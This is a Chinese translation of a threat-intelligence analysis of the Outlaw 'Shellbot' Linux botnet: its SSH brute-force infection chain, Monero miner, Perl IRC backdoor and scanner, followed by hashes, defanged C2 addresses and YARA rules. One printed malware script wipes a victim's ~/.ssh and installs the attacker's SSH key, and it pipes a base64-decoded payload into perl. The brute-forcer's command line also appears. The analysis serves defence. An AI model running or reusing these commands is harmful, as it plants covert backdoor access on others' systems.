**原文链接：[Outlaw is Back, a New Crypto-Botnet Targets European
Organizations](https://yoroi.company/research/outlaw-is-back-a-new-crypto-botnet-targets-european-organizations/ "Outlaw is Back, a New Crypto-Botnet
Targets European Organizations")**  
**译者：知道创宇404实验室翻译组**

### 介绍

在我们的日常监控中，我们拦截了一个试图渗透客户网络的Linux恶意软件，该恶意软件是著名的“ Shellbot ”，被定义为“Outlaw Hacking
Group”的犯罪工具。

早在2018年，TrendMicro首次[发现](https://blog.trendmicro.com/trendlabs-security-intelligence/perl-based-shellbot-looks-to-target-organizations-via-cc/)“Outlaw
Hacking Group”，该犯罪团伙主攻汽车和金融领域，而Outlaw僵尸网通过暴力登录以及SSH漏洞（利用Shellshock
Flaw和[Drupalgeddon2漏洞](https://securityaffairs.co/wordpress/71370/hacking/drupalgeddon2-drupal-flaws.html)）来实现对目标系统（包括服务器和IoT设备）进行远程访问。其中，TrendMicro首次发现的版本还包含一个DDoS脚本，botmaster可以使用该脚本原有设置在暗网上提供DDoS
for-hire服务。

该恶意软件植入程序的主要组件是“Shellbot”变体，它是一个Monero矿机，与一个基于perl的后门捆绑在一起，其中还包括一个基于IRC的bot和一个SSH扫描器。Shellbot自2005年被熟知，近期其出现在网络安全领域，使用的是全新的IRC服务器和全新的Monero
pools，攻击目标为全球组织。

### 技术分析

如前所述，在SSH暴力登录后，如图1所示感染链开始在Linux服务器进行黑客攻击，这其中还包含了不同源IP地址的访问请求，但不同的请求约有30秒的间隔延迟。通过这种欺诈方式，暴力登录能够绕过像Fail2Ban这类锁定登录机制，一旦计算机完全受到威胁，攻击者将安装一个完整的黑客套件（套件由IRC僵尸程序，SSH扫描程序，暴力破解工具和XMRIG加密矿工组成），而所有的恶意程序都会由几个bash或perl脚本进行适当管理。

![1](https://images.seebug.org/content/images/2020/05/14/1589435137000-1cacgy.png-w331s)

图1 Shellbot暴力破解

当计算机完全感染后，安装的文件如下：

![2](https://images.seebug.org/content/images/2020/05/14/1589435138000-2bdtbp.png-w331s)

图2 目录清单

该原始文件夹是一个名为`.rsync`的隐藏目录，包含三个文件和三个子目录。原始文件名为init、init2和initall。它们是三个bash脚本，目的在于安装感染的三个主要组件。执行的第一个组件是initall，它的主体如下：

![3](https://images.seebug.org/content/images/2020/05/14/1589435138000-3muiys.png-w331s)

图3 initall文件的内容

该脚本只有两个宏函数，第一个宏函数用于清除受害者机器上的其他感染或其他进程，这些进程在执行过程中可能会产生某种类型冲突。如下，第36行显示init2文件打印在标准输出上，然后执行。

![4](https://images.seebug.org/content/images/2020/05/14/1589435138000-4sfals.png-w331s)

图4 init2文件的内容

图4显示了init2脚本的内容，在这种情况下，脚本运行三个文件，`init0`、`a 从文件夹 b`、`a 从文件夹 C`。然后使用crontab
linux应用程序进行时间设置。如示意图所示，恶意软件根据要执行的模块和文件准备不同的任务调度配置。

  * `/ a / upd`文件每23天运行一次（第28行）；
  * `/ b / sync`每个星期日的上午08:05（第29行）；
  * 重启时显示`/ b / sync`（第30行）；
  * 每三天`/ c / aptitude`（第31行）；

### “ a”文件夹

第一个分析文件夹是“ a”。该目录包含名为`kswapd0`的加密货币挖掘模块。在此文件夹中，第一个要执行的文件是文件“ a”。该脚本如下所示：

![5](https://images.seebug.org/content/images/2020/05/14/1589435138000-5vhezk.png-w331s)

图5 a 文件夹内容

该脚本的目的是通过读取`/proc/CPU`来查询有关CPU的信息，从而优化挖掘模块，当检索到制造商时，将提供通过特定型号的寄存器实用程序“wrmsr”添加一些特定的注册表值，而这些具体取决于供应商。

紧接着执行upd脚本。upd脚本非常简单，它检查进程是否仍在运行，若没有运行时，则执行脚本`run`。

![6](https://images.seebug.org/content/images/2020/05/14/1589435139000-6witnv.png-w331s)

图6 upd 和 run 的内容

执行的加密挖矿软件是基于著名的XMRIG monero中名为`kswapd0`的加密挖矿文件。以下是相关指纹设置信息：

![04cb09c75971624c38690d8b7538d02](https://images.seebug.org/content/images/2020/05/14/1589435139000-7fftav.png-w331s)

表一 样本信息

该组件具有两个主要功能：

  * 安装cryptoMiner worker：此elf文件的主要目的是实例化crypto-mining worker。它是XMRIG项目的一个分支，XMRIG项目是挖掘monero软件加密值的最流行软件之一。此配置与原始配置一起使用json编写名为`config.json`的配置文件。下图中报告了一段伪代码，负责配置文件的加载：

![7](https://images.seebug.org/content/images/2020/05/14/1589435139000-8smuov.png-w331s)

图7 已加载的配置文件的伪代码

  * 下图报告了所有带monero参数的配置文件：

![8](https://images.seebug.org/content/images/2020/05/14/1589435139000-9gqige.png-w331s)

图8 带有用户，pass和c2的配置文件

安装SSH后门：第二个组件是一个例程，负责在通过授权的ssh密钥文件中安装ssh指纹来设置ssh后门。

![9](https://images.seebug.org/content/images/2020/05/14/1589435140000-10cciht.png-w331s)

图9 授权的ssh密钥

### “ b”文件夹

“ b”文件夹运用后门逻辑，它由三个文件组成：`a`，`run`，`stop`。它们是三个bash脚本，我们开始对其进行分析:

![10](https://images.seebug.org/content/images/2020/05/14/1589435140000-11glyjh.png-w331s)

图10 “ a”脚本文件的内容

脚本是名为“ a ”
的文件。它的主要目的是检查当前工作目录并保存文件`dir.dir`，接着启动`stop`脚本来中断待处理进程执行。最后，授予执行权限，然后执行运行脚本：

    
    
    #!/bin/shnohup ./stop>>/dev/null &sleep 5echo " ENCODED-BASE64-PAYLOAD" | base64 --decode | perlcd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa
    
    AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==
    
    mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh

代码段1

运行脚本执行以base64格式编码另一perl脚本，然后重试存储与图8所示相同的SSH密钥。在perl脚本中，解码base64包装器后，我们利用`pack（）`指令在perl中获得了另一个混淆的代码，如下图所示：

![11](https://images.seebug.org/content/images/2020/05/14/1589435140000-12hsfmg.png-w331s)

图11 打包的脚本

但是，通过解码来获取真正的恶意代码却是非常容易的：

![12](https://images.seebug.org/content/images/2020/05/14/1589435140000-13ojayb.png-w331s)

图12 ShellBot客户端片段

ShellBot恶意软件是最著名的Linux IRC bot之一，该ShellBot包含使用IRC协议与C2进行通信的所有通信逻辑。有趣的是`C2
45.9.148
[。＃99`使用的是一个不寻常的端口来管理IRC协议443（通常与HTTPS协议相关联），频道为`＃007`，管理员从中接收“polly”和“molly”命令。我们试图连接它来估计受害者的数量，但是不幸的是，在撰写本文时，服务器似乎并未处于活动状态。

IRC服务器位于其他C2的同一子网上，并且都属于“Nice IT Service Group”（来自荷兰的提供商）。C2部署了一个`Unreal
ircd`务器（图13）。

![13](https://images.seebug.org/content/images/2020/05/14/1589435140000-14lyxyw.png-w331s)

图13 IRC C2相关信息

### “ c”文件夹

然后，init2脚本（在图4中）执行`c/start`，如下图所示。开始脚本执行“run”，将其重命名为“aptitude”。

![14](https://images.seebug.org/content/images/2020/05/14/1589435141000-15aylso.png-w331s)

图14 “Run”脚本文件内容

“run”脚本会对CPU体系结构进行一次检查，对处理器数量进行二次检查。若机器人在少于7个处理器的64位系统上运行，则会执行“go”脚本。在第17行，执行另一个控制；如果系统是32位的，则不检查处理器的数量，目前关于此执行原理尚不清楚。

![15](https://images.seebug.org/content/images/2020/05/14/1589435141000-16qmchu.png-w331s)

图15 运行脚本的内容

“go”脚本在启动“tsm”组件之前执行一些初步操作，如图16所示。脚本检查体系结构，并在此基础上定义线程数。如果它在arm架构上运行，则线程数设置为75（如第9行所示），否则线程数设置为515（如第5行所示）。

![16](https://images.seebug.org/content/images/2020/05/14/1589435141000-17pjutn.png-w331s)
图16 go脚本的内容

### “ tsm”模块：多级SSH-Bruteforcer

此时，脚本将启动“tsm”模块。该模块是一种网络扫描仪和暴力登录软件，名为“Faster Than
Lite”（图17）。FTL是可能会在犯罪论坛上出售的一种工具，而不是定制工具。

![17](https://images.seebug.org/content/images/2020/05/14/1589435142000-18gzuda.png-w331s)

图17 “Faster Than Light” 的有效载荷证据

然后使用以下参数执行“ tsm ”工具：

    
    
    timeout 3h ./tsm -t $threads -f 1 -s 12 -S 10 -p 0 -d 1 p ip

在改配置中：超时3h意味着脚本执行3小时。

  * -f 1表示A.B类/16扫描，-s 12是两个请求之间的超时时间，在本例中为12秒（这可能是为了克服某些登录锁定机制）。
  * -S 10是设置为10秒的第二个超时，目前尚不清楚第二个超时的用法。
  * p参数定义为要连接的端口，将此参数设置为0表示多端口。帮助菜单中没有-d参数，这表明该工具可能正在开发中，尚未成熟（由于存在调试信息），但按预期工作。
  * ip的定义是指读取ip端口文件，即由两个C2中的一个用图18所示的加密的多个SSH请求下载的文件，这是第一阶段。

![18](https://images.seebug.org/content/images/2020/05/14/1589435142000-19qfcvt.png-w331s)

图18 来自C2的SSH流量

一旦下载了IP列表，便开始阶段2。

在此阶段，它使用先前下载的列表中包含的IP执行ssh
bruteforce逻辑。在撰写本文时，下载的列表包含属于不同国家的94.541个不同IP地址。我们对这些独特的IP进行排序，然后按国家对它们进行汇总，结果如图19所示。

如热图所示，受影响最严重的国家是拥有34998个IP的美国，其次是中国——8688个，德国——6891个，法国——4068个。整个欧洲大陆分布均匀，但意大利拥有658个独特的IP。

![19](https://images.seebug.org/content/images/2020/05/14/1589435142000-20jxwem.png-w331s)

图19 IP地址分布图

我们发现tsm组件包含pscan和SSH扫描，分别是使用端口扫描程序和bruteforcer。为了寻找有用的信息，经过数据整合发现自2012年以来，该操作已出现在几个蜜罐上，而脚本的风格和实现的技术都与之相似。其中一个脚本含有一封电子邮件“mafia89tm@yahoo.com”和一些数据，这些都指向了罗马尼亚团体组织。

### 结论

目前，Outlaw僵尸网络仍然活跃，它的目标仍是全世界的组织，但这次是新的monero pool和不同的C2。

命令和控制IRC服务器在编写时已关闭，但提供受害者IPs列表的两个C2仍处于活动状态。这意味着，很有可能该团伙将部署一个新的IRC服务器。

因此我们建议应该加强和更新SSH服务器，使用授权密钥配置身份验证并禁用密码。

### 相关指标

**Hashes**

ac2513b3d37de1e89547d12d4e05a899848847571a3b11b18db0075149e85dcc
./.rsync/c/lib/32/tsm

b92e77fdc4aa3181ed62b2d0e58298f51f2993321580c8d2e3368ef8d6944364
./.rsync/c/slow

f95c1c076b2d78834cc62edd2f4c4f2f6bfa21d07d07853274805859e20261ba
./.rsync/c/watchdog

99fa6e718f5f54b1c8bf14e7b73aa0cda6fe9793a958bd4e0a12916755c1ca93
./.rsync/c/tsm64

e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 ./.rsync/c/v

d6c230344520dfc21770300bf8364031e10758d223e8281e2b447c3bf1c43d2b
./.rsync/c/tsm32

5a1797ae845e8c80c771ece9174b93ad5d5a74e593fe3b508ba105830db5fd92
./.rsync/c/run

0bf8868d117a7c45276b6f966c09830b010c550cd16a2b0d753924fca707c842
./.rsync/c/tsm

9dbbc9b5d7793425968e42e995226c5f9fe32e502a0a694320a5e838d57c8836
./.rsync/c/start

f942240260f0281a3c0e909ac10da7f67f87fb8e2a195e2955510424e35a8c8b
./.rsync/c/stop

e62be7212627d9375e7b7afd459644d3f8b4c71a370678eb7fa497b9850a02d5 ./.rsync/c/go

1cc9c6a2c0f2f41900c345b0216023ed51d4e782ed61ed5e39eb423fb2f1ddd8
./.rsync/c/golan

b2469af4217d99b16a4b708aa29af0a60edeec3242078f42fa03b8eaf285d657
./.rsync/b/run

dc43fdfbb5f7e8ecc80353dcd85889c0c08483c99acbce35b3ed8f399c936920 ./.rsync/b/a

1c42bfcfb910013ebe02adeb6127884de54ea225161d0a7347c05c2c4e6fbf49
./.rsync/b/stop

fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708
./.rsync/a/kswapd0

18b77e655b323fa07dad9d7b64631dbaa428da7d347b9b9497276f4d466079fe
./.rsync/a/run

dc43fdfbb5f7e8ecc80353dcd85889c0c08483c99acbce35b3ed8f399c936920 ./.rsync/b/a

1c42bfcfb910013ebe02adeb6127884de54ea225161d0a7347c05c2c4e6fbf49
./.rsync/b/stop

fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708
./.rsync/a/kswapd0

18b77e655b323fa07dad9d7b64631dbaa428da7d347b9b9497276f4d466079fe
./.rsync/a/run

9d4fef06b12d18385f1c45dd4e37f031c6590b080ea5446ff7a5bac491daea50 ./.rsync/a/a

1c7b4c7ab716159b6dc9fc5abc6ae28ab9dfa0d64e3d860824692291a7038a4e
./.rsync/a/stop

e38ff53f3978c84078b016006389eb3b286443d61cbabb7d5a4f003c8ae67421
./.rsync/a/init0

befdf0be5b811621a72eddafad1886321102be1ec3417030888371c5554d9d1a
./.rsync/initall

16d93464ebd8f370011bf040cb4aec7699f4be604452eb5efcd77e5d5e67ae1b ./.rsync/init

**C2**

  * debian-package[.center
  * 45.9.148[.125
  * 45.9.148[.129
  * 45.9.148[.99

### Yara Rules

    
    
    rule XMRIG_Miner_Shellbot_Apr20{
    meta:
          description = "XMRIG Miner of the shellbot campaign"
          hash = "fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708"
          author = "Cybaze - Yoroi  ZLab"
          last_updated = "2020-04-27"
          tlp = "white"
          category = "informational"
    
    strings:
        $s1 = { D3 EA FF 98 ?? ?? ?? ?? D3 EA FF }
        $s2 = { 50 ?? EA FF 28 D3 }
        $s3 = { 48 03 7D ?? 48 63 15 95 ?? ?? ?? 48 39 FE 76 ?? 48 8D 04 17 48 39 C6 }
    condition:
        all of them
    }
    
    
    import "elf"
    
    rule TSM_FasterThanLite_Outlaw_Apr20 
    {
    meta:
          description = "TSM ssh bruteforce component of Outlaw Botnet April 2020"
          hash32 = "3eef8c27ad8458af84dcb52dfa01295c427908a0" // for tsm32 (32 bit)
          hash64 = "a1da0566193f30061f69b057c698dc7923d2038c" // for tsm64 (64 bit)
    
          author = "Cybaze - Yoroi  ZLab"
          last_updated = "2020-04-27"
          tlp = "white"
          category = "informational"
    
    
     strings:
              $s1= {63 73 2D 64 76 63 00 69 64 2D 73 6D 69 6D 65 2D
    61 6C 67 2D 45 53 44 48 77 69 74 68 33 44 45 53
    00 69 64 2D 73 6D 69 6D 65 2D 61 6C 67 2D 45 53
    44 48 77 69 74 68 52 43 32 00 69 64 2D 73 6D 69
    6D 65 2D 61 6C 67 2D 33 44 45 53 77 72 61 70 00
    69 64 2D 73 6D 69 6D 65 2D 61 6C 67 2D 52 43 32
    77 72 61 70 00 69 64 2D 73 6D 69 6D 65 2D 61 6C
    67 2D 45 53 44 48 00 69 64 2D 73 6D 69 6D 65 2D
    61 6C 67 2D 43 4D 53 33}
    
        $s2= {2D 70 6C 61 63 65 4F 66 42 69 72 74 68 00 69 64
    2D 70 64 61 2D 67 65 6E 64 65 72 00 69 64 2D 70
    64 61 2D 63 6F 75 6E 74 72 79 4F 66 43 69 74 69
    7A 65 6E 73 68 69 70}
    
        $s3 ="brainpoolP384r1" wide ascii
        $s4= "getpwnam" wide ascii //mutex
        $s5 = "dup2" wide ascii //mutex
        $s6 = "_ITM_deregisterTMCloneTable" wide ascii //mutex
        $elf = { 7f 45 4c 46 } //ELF file’s magic numbers
    
            condition:
                    $elf in (0..4) and all of them and elf.number_of_sections > 25 
    
    }

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1204/>

